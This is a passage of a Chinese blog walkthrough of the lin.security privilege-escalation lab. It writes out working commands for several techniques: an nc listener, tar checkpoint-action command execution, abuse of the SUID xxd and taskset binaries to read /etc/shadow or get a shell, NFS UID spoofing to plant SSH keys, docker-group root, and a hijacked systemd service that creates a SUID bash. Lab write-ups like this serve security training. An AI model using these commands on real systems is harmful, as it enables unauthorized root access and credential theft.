+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -lvnp <span class="m">8888</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>–checkpoint[=NUMBER] 显示每个Numbers记录的进度消息（默认值为10）
+–checkpoint-action=ACTION 在每个checkpoint（检查点）上执行ACTION</p>
+</blockquote>
+<p>这里的 –checkpoint-action 选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项 –checkpoint=1 和 –checkpoint-action=exec=sh shell.sh 作为命令行选项交给了 tar 程序。</p>
+<h2 id="5-利用隐藏文件">5 利用隐藏文件</h2>
+<p>有时候隐藏文件会存放一些重要的信息，比如我们搜索 <code>home</code> 目录下的所有隐藏文件，并用 <code>ls -al</code> 显示出来。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -name <span class="s2">&#34;.*&#34;</span> -type f -path <span class="s2">&#34;/home/*&#34;</span> -exec ls -al <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105051.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105051.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105051.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105051.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105051.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105051.png-water_print" /></p>
+<p>发现了 <code>susan</code> 这个用户有一个 <code>.secret</code> 的隐藏文件，发现里面存放 <code>susan</code> 这个用户的登陆密码。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105152.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105152.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105152.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105152.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105152.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105152.png-water_print" /></p>
+<h2 id="6-利用-suid">6 利用 SUID</h2>
+<h3 id="61-方案一">6.1 方案一</h3>
+<p>SUID 这个是 <code>uid +s</code> 的组合，s 指的是特殊权限。一般情况下，用户的权限是 3 位，比如 0755 这样的，默认特殊权限没有配置，但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有 root 的权限，就会配置特殊权限。</p>
+<p>比如说 passwd 这个命令，这个命令会修改 <code>/etc/shadow</code> 文件，而 <code>/etc/shadow</code> 只有 root 才能修改，本来 passwd 这个命令应该也只能 root 才能执行的。但是系统为了让普通用户能够修改自己的密码，对 passwd 这个命令赋予了特殊权限并添加了只能修改自己密码的限制。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105347.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105347.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105347.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105347.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105347.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105347.png-water_print" /></p>
+<p>由于 passwd 这个命令是做过限制的，所以赋予特殊权限是没有问题的，但是如果系统超级用户特殊权限乱用，就会导致提权的问题。
+那我们怎么去寻找系统是否存在特殊权限配置的文件呢？可以使用如下命令快速查找所有 SUID 文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -perm -4000 -type f -exec ls -la <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们发现了如下一个文件 xxd。这个文件其实是命令文件，xxd 的作用是将一个文件以 16 进制的形式显示出来。他被配置了特殊权限，并且用户组为 itservices 是拥有执行权限 x 的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105638.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105638.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105638.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105638.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105638.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105638.png-water_print" /></p>
+<p>这就很危险了，一旦 suid 和执行权限在一起就可能导致权限提升。</p>
+<p>我们通过命令查看发现 susan 这个用户属于 itservices 这个用户组。</p>
+<p>我们用它来查看 <code>/etc/shadow</code> 这个文件，更多利用方法可以参考<a href="https://gtfobins.github.io/gtfobins/xxd/" target="_blank" rel="noopener noreffer">https://gtfobins.github.io/gtfobins/xxd/</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">xxd <span class="s2">&#34;/etc/shadow&#34;</span> <span class="p">|</span> xxd -r
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110243.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110243.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110243.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110243.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110243.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110243.png-water_print" /></p>
+<p><code>注</code>： <code>find /dir -exec &quot;command&quot;</code> 同样的提权效果。</p>
+<h3 id="62-方案二">6.2 方案二</h3>
+<p>除了上述的文件外，还发现了一个 other 角色拥有执行权限的文件，这个文件不限用户，所以危害更大。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110406.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110406.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110406.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110406.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110406.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110406.png-water_print" /></p>
+<p>参考<a href="https://gtfobins.github.io/gtfobins/taskset/#suid-enabled" target="_blank" rel="noopener noreffer">https://gtfobins.github.io/gtfobins/taskset/#suid-enabled</a>，发现该文件可以直接获取shell。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110657.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110657.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110657.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110657.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110657.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031110657.png-water_print" /></p>
+<h2 id="7-nfs-提权">7 NFS 提权</h2>
+<p>nmap 扫描端口，查看开放服务：<code>nmap -sS -Pn -p- -A IP</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031113629.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031113629.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031113629.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031113629.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031113629.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031113629.png-water_print" /></p>
+<p>看到开放 2049 端口，NFS 服务。也可以通过 <code>rpcinfo -p IP</code>  命令来确定主机上是否运行或挂载了 NFS 服务。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114151.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114151.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114151.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114151.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114151.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114151.png-water_print" /></p>
+<p>当 <code>showmount</code> 命令与以下参数一起使用时，可以进行信息收集，例如：</p>
+<ul>
+<li>挂载点</li>
+<li>连接的主机</li>
+<li>目录</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">showmount IP // 连接的主机
+showmount -d IP // 目录
+showmount -a IP // 挂载点
+</code></pre></td></tr></table>
+</div>
+</div><p>在 msf 中也有一个模块，可以用来列出导出文件夹：<code>auxiliary/scanner/nfs/nfsmount</code>。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114459.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114459.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114459.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114459.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114459.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031114459.png-water_print" /></p>
+<p>账号 peter 的家目录可以被挂载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkdir /mnt/peter
+mount 192.168.68.99:/home/peter /mnt/peter/
+</code></pre></td></tr></table>
+</div>
+</div><p>挂载好的 peter 的家目录，显示的文件的所有者和所属组分别为 1001 和 1005</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115226.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115226.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115226.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115226.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115226.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115226.png-water_print" /></p>
+<p>尝试在该目录下创建文件，发现权限不够。</p>
+<p>即使我们在 kali 攻击机上是 root 用户，但是我们还是没有写入权限，因为默认情况下客户端的 root 身份会被主动压缩成匿名者。</p>
+<p>可以伪造文件所有者的 UID 和 GID 来欺骗 NFS 服务器，创建一个 gid 为 1005 的用户组，接着创建 peter 这个账户 uid 指定为 1001，gid 指定为 1005。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115413.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115413.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115413.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115413.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115413.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115413.png-water_print" /></p>
+<p>切换客户端用户为 peter，服务端也认为是存在的用户 peter</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115618.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115618.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115618.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115618.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115618.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115618.png-water_print" /></p>
+<p>可以直接向 .ssh 文件夹下写入公钥，然后直接使用 ssh 登录。</p>
+<h2 id="8-利用-docker-组提权">8 利用 docker 组提权</h2>
+<p>可以发现 peter 属于 docker 组：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115855.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115855.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115855.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115855.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115855.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031115855.png-water_print" /></p>
+<p>可以根据<a href="https://fosterelli.co/privilege-escalation-via-docker.html" target="_blank" rel="noopener noreffer">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
+<p><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></p>
+<h2 id="9-systems-配置不当提权">9 systems 配置不当提权</h2>
+<p>历史上，Linux 的启动一直采用 init 进程：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo /etc/init.d/sshd start
+<span class="c1"># 或者</span>
+service sshd start
+</code></pre></td></tr></table>
+</div>
+</div><p>这种方法有两个缺点：</p>
+<p>一是启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</p>
+<p>二是启动脚本复杂。init 进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。</p>
+<p>Systemd 就是为了解决这些问题而诞生的。它的设计目标是，为系统的启动和管理提供一套完整的解决方案。 使用了 Systemd，就不需要再用 init 了。Systemd 取代了 initd，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。 Systemd 并不是一个命令，而是一组命令，涉及到系统管理的方方面面。 systemctl 是 Systemd 的主命令，用于管理系统。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 重启系统</span>
+sudo systemctl reboot
+</code></pre></td></tr></table>
+</div>
+</div><p>查看 peter 用户的 systemd 配置，发现 peter 这个用户拥有 <code>debug.service</code> 文件，并且它对这个文件<strong>拥有读和写</strong>的权限。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120819.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120819.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120819.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120819.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120819.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120819.png-water_print" /></p>
+<p>如果服务器存在缺陷，可以<strong>被覆盖或者修改文件</strong>，可以通过修改低权限用户有权访问的 <code>.service</code> 文件并更改 <code>run()</code> 命令来将其转换为代码执行。重新启动服务时，将运行攻击者的命令。</p>
+<p>查看 <code>.service</code> 文件，这里我们可以修改 <code>ExecStart</code> 文件，除此之外还可以修改 <code>ExecStop</code> 和 <code>ExecReload</code> 来在停止和重启服务时执行命令。 查看该 <code>.service</code> 文件：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120959.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120959.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120959.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120959.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120959.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20101031120959.png-water_print" /></p>
+<p><code>ExecStart</code> 为 <code>/root/debug</code>，这是一个二进制服务并且该服务以 root 身份运行。 接下来为了利用，使用一个类似 ssh 可以 sudo 执行的方法。 让 root 身份来创建一个 <code>systemdexpl.sh</code> 脚本，将 <code>/bin/bash</code> 文件复制到 <code>systemdbash</code> 并设置一个 SUID 位并且赋予执行权限。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash&#39;</span> &gt; /home/peter/systemdexpl.sh <span class="o">&amp;&amp;</span> chmod +x systemdexpl.sh
+</code></pre></td></tr></table>
+</div>
+</div><p>修改 debug.service 文件来调用我们的脚本（root 调用 debug.service，而 debug.service 又调用我们的 systemdexpl.sh 脚本）修改 ExecStart 为当前脚本。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031121336.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031121336.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031121336.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031121336.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031121336.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031121336.png-water_print" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-10-31</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/" data-title="in.security 提权靶场"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/" data-title="in.security 提权靶场"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/" data-title="in.security 提权靶场"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%8F%90%E6%9D%83/">提权</a>,&nbsp;<a href="/tags/%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/">提权靶场</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/" class="prev" rel="prev" title="AD 活动目录管理"><i class="fas fa-angle-left fa-fw"></i>AD 活动目录管理</a>
+            <a href="/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="next" rel="next" title="Apache Shiro padding oracle attack漏洞复现">Apache Shiro padding oracle attack漏洞复现<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
